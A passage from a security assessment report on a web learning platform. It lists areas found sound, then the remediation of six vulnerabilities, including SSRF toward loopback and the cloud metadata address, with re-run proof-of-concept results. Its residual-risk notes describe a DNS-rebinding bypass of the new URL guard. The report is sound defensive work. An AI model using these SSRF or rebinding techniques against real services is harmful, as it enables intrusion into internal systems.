neutralises it completely: `inf → 0.0`, `NaN → 1.0` (because `min(1.0, nan)` returns `1.0` under CPython's comparison semantics), and the output is always within `[0, 1]`. Empirically verified end to end — `mastery_score` remained `0.5`, `0.5525` and `0.5` for `inf`, `NaN` and `-9e99` respectively. No `NaN` ever reaches JSON serialization. The clamp is doing exactly the job a clamp exists to do.
**Optional:** add explicit `Field(ge=..., le=...)` bounds so rejection happens at the boundary with a clear 422 rather than being silently absorbed. Robustness, not security.

---

## Appendix B — Verified clean

The following were specifically examined and found sound. This section is not filler; it is the reason the findings above are characterised as an assumption failure rather than a code-quality failure.

**Injection and unsafe execution**
- **No SQL injection.** All database access goes through the SQLAlchemy ORM or parameterized queries. The sole raw SQL in the tree is `text("SELECT 1")` in the readiness probe (`apps/api/app/main.py:38`).
- **No dangerous evaluation or deserialization.** No `eval`, `exec`, `pickle`, `subprocess`, `yaml.load`, or shell invocation anywhere in the codebase.

**Tooling results**
- **bandit:** 0 issues across 3,435 LOC.
- **pip-audit:** 0 known CVEs, both Python services.
- **npm audit:** 0 vulnerabilities.
- **gitleaks** (full commit history): only the labelled CI test key (A7). `.env` was never committed; `.gitignore` and `.dockerignore` are correct.

**Frontend**
- **XSS handled correctly.** Markdown is rendered via `marked` and passed through `DOMPurify.sanitize` (`apps/web/src/components.tsx:65`) before reaching the single `dangerouslySetInnerHTML` in the codebase (line 67).
- **URL scheme allowlisting.** `safeUrl()` (`apps/web/src/utils.ts:26-33`) parses with the `URL` constructor and returns a value only for `http:` and `https:`, so a `javascript:` URL entered in a manual resource cannot become a live link.
- The API client sends `credentials: "omit"` and deliberately declines to render server-supplied error strings.

**Application logic**
- **Quiz answers are not leaked.** `AssessmentQuestionOut` (`apps/api/app/schemas/assessment.py:8-17`) omits `expected_answer`, which exists only on the `AssessmentQuestion` model and is read server-side by `grade_attempt` (`apps/api/app/services/mastery_service.py:16-28`).
- **AI guardrails are genuinely strong.** Model output is validated against a JSON Schema; `additional_support` is constrained to a 5-value enum; suggestions are confidence-gated at 0.5; and `verdict.combine()` (`packages/learning_engine/adaptation/verdict.py:32-54`) rejects any suggestion that would weaken the deterministic floor. Prompt injection into the adaptation path is meaningfully contained — the AI can only ever *add* support, never relax a mastery decision.
- **Credential encryption** uses Fernet and fails closed (A5). Only masked labels (`****` + last 4 characters, fixed-width to avoid leaking key length — `apps/api/app/core/crypto.py:31-36`) leave the API.

---

## Remediation status

**Status: all six confirmed vulnerabilities remediated and verified.** Fixes were
implemented after the assessment, and each original exploit was re-run against the
patched tree.

### Summary

| ID | Change | Verification |
|---|---|---|
| V1 | All six published ports bound to `127.0.0.1` in `docker-compose.yml` | Compose parsed; 6/6 mappings loopback-bound |
| V2 | `allow_origins=["*"]` replaced with an explicit allowlist from `APP_BASE_URL` (+ `CORS_EXTRA_ORIGINS`); methods and headers narrowed | Hostile origin receives no `Access-Control-Allow-Origin`; legitimate origin still allowed; semgrep `wildcard-cors` cleared |
| V3 | New `packages/ai_providers/url_guard.py` screens every caller-supplied `base_url`; upstream response bodies no longer reflected into error strings | Loopback, RFC1918 and metadata targets all refused; `job.error_summary` reduced to `provider error 403` |
| V4 | Brain requires `X-Brain-Auth` (constant-time compare) and fails closed when unset; the V3 URL guard applies to its request body too | Unauthenticated returns 401 with **zero** outbound requests; unset secret returns 503; authenticated caller still cannot reach loopback (422) |
| V5 | `POSTGRES_PASSWORD` interpolated into both the postgres container and the api/worker DSNs | No hardcoded `change-me` DSN remains; editing `.env` now takes effect on both sides |
| V6 | Dependency-free fixed-window rate limiter plus a request-body cap (`apps/api/app/core/ratelimit.py`) | Plan generation capped at 12/hour per client; oversized body returns 413 |

### Files changed

```
packages/ai_providers/url_guard.py          (new) SSRF guard, shared by both services
packages/ai_providers/registry.py           validate base_url at the single choke point
packages/ai_providers/openai_compatible.py  _upstream_error(): log the body, do not raise it
packages/ai_providers/ollama.py             same treatment
packages/connectors/youtube.py              healthcheck detail no longer echoes the body
apps/api/app/main.py                        origin allowlist + rate-limit middleware
apps/api/app/core/config.py                 app_base_url, CORS / rate-limit / brain settings
apps/api/app/core/ratelimit.py              (new) fixed-window limiter + body cap
apps/api/app/services/credential_service.py screen base_url at the API boundary
apps/api/app/api/v1/credentials.py          surface a refused URL as 422, not 500
apps/api/app/services/brain_client.py       present X-Brain-Auth on every brain call
apps/brain/app/main.py                      require_brain_auth on both endpoints
docker-compose.yml                          loopback port bindings; password interpolation
.env.example                                POSTGRES_PASSWORD, BRAIN_SHARED_SECRET, limits
SECURITY.md                                 false localhost claim replaced with the mechanism
apps/api/tests/test_url_guard.py            (new) 17 regression tests
apps/brain/tests/test_main.py               auth coverage: 401 / 503 / 422 paths
```

### Verification evidence

Re-running the three original proof-of-concepts against the patched tree:

```
V3  [FIXED] loopback base_url refused        -> resolves to non-public address 127.0.0.1
    [FIXED] cloud metadata base_url refused  -> link-local 169.254.169.254 (metadata range)
    [FIXED] upstream body no longer reflected into job.error_summary
            job.error_summary would now be: 'provider error 403'
    [FIXED] ollama can still reach localhost (no regression)

V4  [FIXED] unauthenticated adapt refused                  HTTP 401
    [FIXED] no outbound request for unauthenticated caller 0 reached the internal target
    [FIXED] authenticated caller cannot aim brain at loopback  HTTP 422, 0 outbound
    [FIXED] fails closed when secret unset                 HTTP 503

V2  [FIXED] hostile origin gets no CORS grant        Access-Control-Allow-Origin = None
    [FIXED] legitimate frontend origin still allowed  = 'http://localhost:3000'
```

Test suites, both green with no regressions:

- `apps/api`: **55 passed** (38 pre-existing, plus 17 new SSRF-guard regression tests)
- `apps/brain`: **10 passed** (4 pre-existing, updated for auth, plus 6 new)
- semgrep re-scan: `wildcard-cors` **cleared**; 3 `missing-user` findings remain by decision (below)

### Deliberately not changed

- **Non-root container users (A1).** `USER` is absent from all three Dockerfiles, and semgrep and trivy still flag it. Adding it interacts with the bind-mounted source volumes and with the `alembic upgrade head` step in the api container command, and that interaction could not be tested without Docker in the assessment environment. Shipping an unverifiable change to the deployment path was judged worse than leaving a documented hardening gap. Recommended as a separate, tested change.
- **Dependency pinning (A3) and CI action SHA-pinning (A4).** Both are risk-posture improvements rather than fixes to a reachable defect, and both change the build in ways that warrant their own review.
- **Fail-fast on an invalid `CREDENTIAL_ENCRYPTION_KEY` (A5).** Left as-is: the current behaviour already fails closed, and it incidentally blocks V3 on default-configured deployments. Worth improving as a usability matter, not a security one.

### Residual risks

- **DNS rebinding against the URL guard.** `validate_provider_url` resolves the host and checks every returned address, but an attacker controlling a domain could return a public address at validation time and a private one when httpx connects moments later. Closing this fully requires pinning the validated IP through to the connection, which the current httpx usage does not support.
- **Unresolvable hostnames pass the guard** (documented in the module). A name that does not resolve cannot be an internal target, and offline and development configurations depend on this behaviour.
- **The rate limiter is per-process and in-memory.** A multi-worker deployment multiplies the effective ceiling by the worker count, and counters reset on restart. Anything exposed beyond loopback wants a reverse proxy enforcing limits properly.
- **The V1 Redis sub-claim remains unverified.** Loopback binding makes it moot for LAN exposure, but the underlying question — whether Redis protected-mode accepts the Celery worker cross-container connection — still warrants one empirical test on a machine with Docker.


---

*Report prepared 2026-09-16 against commit `52d136f` (branch `master`). Findings were validated through the fp-check false-positive verification methodology; the one sub-claim that could not be empirically tested is explicitly marked as unverified in V1.*
